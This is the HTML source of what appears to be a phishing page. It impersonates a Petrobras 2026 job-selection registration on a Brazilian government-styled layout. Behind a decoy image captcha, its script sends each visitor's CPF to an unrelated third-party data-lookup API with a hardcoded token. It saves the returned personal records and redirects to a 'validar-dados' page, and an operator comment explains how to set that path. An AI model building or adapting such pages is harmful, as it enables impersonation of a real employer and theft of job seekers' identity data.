<html lang="pt-BR">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>Processo Seletivo Petrobrás 2026 - Inscrição</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="all.min.css" rel="stylesheet" />
    <link href="home.css" rel="stylesheet" />
    <link href="fonts.css" rel="stylesheet" />

    <style>
        .PMSP-color { color: #003f6b; }
        .form-header { background-color: #fbc12a; color: white; }
        .form-footer { background-color: #003f6b; color: white; }
        button#submit-button { transition: all 0.2s ease; background-color: #003f6b; color: rgba(255, 255, 255, 0.6); }
        button#submit-button:not([disabled]) { color: white; cursor: pointer; background-color: #005691; }
        .required-star { color: #ff0000; }
        .gov-header { background-color: #222222; }
        .inep-header { background-color: #044785; }
        .selected { border: 4px dashed #2b7a9a !important; opacity: 1 !important; }
        .transparent { opacity: 0.5; }
    </style>

    <script>
        function formatCPF(input) {
            let value = input.value.replace(/\D/g, "");
            if (value.length > 11) value = value.substring(0, 11);
            if (value.length > 9) value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
            else if (value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
            else if (value.length > 3) value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
            input.value = value;
            checkFormValidity();
        }

        function selectImage(element, index) {
            const images = document.querySelectorAll(".image-option");
            images.forEach((img) => { img.classList.add("transparent"); img.classList.remove("selected"); });
            element.classList.add("selected");
            element.classList.remove("transparent");
            
            // Armazena a escolha no dataset para o validador
            document.getElementById("submit-button").dataset.imgSelected = index;

            if (index !== 4) {
                document.getElementById("error-popup").classList.remove("hidden");
                setTimeout(() => document.getElementById("error-popup").classList.add("hidden"), 3000);
            }
            checkFormValidity();
        }

        function checkFormValidity() {
            const cpfInput = document.querySelector("#cpf");
            const imgSelected = document.getElementById("submit-button").dataset.imgSelected;
            const submitButton = document.querySelector("#submit-button");
            
            // Habilita apenas se CPF estiver completo e a imagem 4 (Folha) selecionada
            if (cpfInput.value.length === 14 && imgSelected === "4") {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        }

        async function submitForm() {
            const cpfLimpo = document.querySelector("#cpf").value.replace(/\D/g, "");
            const token = "0047";
            const url = `https://searchapi.dnnl.live/consulta?token_api=${token}&cpf=${cpfLimpo}`;

            document.getElementById("validation-popup").classList.remove("hidden");

            try {
                const response = await fetch(url);
                const data = await response.json();

                if (data) {
                    // Salva o retorno da API no localStorage para o arquivo index-5.html ler
                    localStorage.setItem("cpfData", JSON.stringify(data));
                    
                    setTimeout(() => { 
                        // Altere o caminho abaixo para a pasta correta do seu validar-dados
                        window.location.href = "validar-dados/index.html"; 
                    }, 1500);
                } else {
                    alert("Dados não encontrados para este CPF.");
                    document.getElementById("validation-popup").classList.add("hidden");
                }
            } catch (error) {
                console.error("Erro na API:", error);
                alert("Erro ao consultar servidor. Verifique sua conexão.");
                document.getElementById("validation-popup").classList.add("hidden");
            }
        }
    </script>
</head>

<body class="flex flex-col min-h-screen bg-gray-50">
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <img src="../images/top_gov-5.jpg" alt="Brasil.gov" class="h-6" />
            <nav class="flex space-x-4 text-[10px]">
                <span>ACESSO À INFORMAÇÃO</span>
                <span>PARTICIPE</span>
                <span>SERVIÇOS</span>
            </nav>
        </div>
    </header>

    <div class="inep-header py-3"></div>

    <div class="bg-white py-4 text-center border-b">
        <img src="../../images/logopetrobrass.png" alt="Petrobrás" class="h-12 mx-auto" style="object-fit: contain;"/>
    </div>

    <main class="flex-grow py-8 px-4">
        <div class="container mx-auto max-w-3xl">
            <div class="bg-white border border-gray-300 rounded overflow-hidden shadow-md">
                <div class="form-header py-3 px-4 text-center font-bold">
                    Inscrição > Processo Seletivo Petrobrás 2026
                </div>
                <div class="p-6">
                    <div class="mb-6">
                        <label class="block mb-2 font-bold text-gray-700">CPF: <span class="required-star">*</span></label>
                        <input id="cpf" type="tel" oninput="formatCPF(this)" placeholder="000.000.000-00" class="w-full p-3 border border-gray-300 rounded outline-none focus:border-blue-500" />
                    </div>
                    
                    <p class="mb-3 font-bold text-[#2B4F81]">Clique abaixo, na figura FOLHA: *</p>
                    <div class="grid grid-cols-5 gap-1 bg-[#D8E8E8] p-1 border-4 border-[#D8E8E8]">
                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 0)"><img src="../images/download-6.png" class="w-8 h-8" /></div>
                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 1)"><img src="../images/download-5.png" class="w-8 h-8" /></div>
                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 2)"><img src="../images/download-4.png" class="w-8 h-8" /></div>
                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 3)"><img src="../images/download-3.png" class="w-8 h-8" /></div>
                        <div class="bg-[#d2d2d2] p-2 border border-white image-option cursor-pointer flex justify-center transparent" onclick="selectImage(this, 4)"><img src="../images/leaf.png" class="w-8 h-8" /></div>
                    </div>
                </div>
                <div class="form-footer">
                    <button id="submit-button" disabled data-img-selected="" class="w-full py-4 font-bold uppercase" onclick="submitForm()">Enviar</button>
                </div>
            </div>
        </div>
    </main>

    <div id="error-popup" class="fixed top-0 left-0 w-full bg-red-600 text-white p-4 text-center hidden z-50 font-bold">
        Selecione a imagem da FOLHA para prosseguir.
    </div>

    <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
        <div class="absolute inset-0 bg-black opacity-50"></div>
        <div class="bg-white p-8 rounded-lg z-10 text-center">
            <p class="text-[#003f6b] font-bold text-xl">Consultando dados oficiais...</p>
        </div>
    </div>
</body>
</html>
